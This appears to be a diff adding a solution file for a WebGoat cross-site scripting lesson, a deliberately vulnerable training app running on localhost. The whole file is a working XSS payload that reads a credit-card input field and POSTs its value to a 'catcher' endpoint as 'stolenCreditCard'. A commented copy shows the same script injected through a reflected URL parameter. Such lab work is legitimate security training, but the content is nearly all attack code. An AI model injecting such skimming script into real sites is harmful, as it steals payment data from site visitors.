@@ -1,0 +1,17 @@
+<script>
+	var card_arr = document.querySelectorAll("input[name='input1']");
+	var credURL="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard="+card_arr[0].value;
+	var xmlHTTP = new XMLHttpRequest();
+	xmlHTTP.open("POST",credURL, false);
+	xmlHTTP.send(null);
+</script>
+
+<!--
+http://localhost:8090/WebGoat/start.mvc#attack/1731484628/900?input1=123&input2=<script>
+	var card_arr = document.querySelectorAll("input[name='input1']");
+	var credURL="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard="+card_arr[0].value;
+	var xmlHTTP = new XMLHttpRequest();
+	xmlHTTP.open("POST",credURL, false);
+	xmlHTTP.send(null);
+</script>
+-->
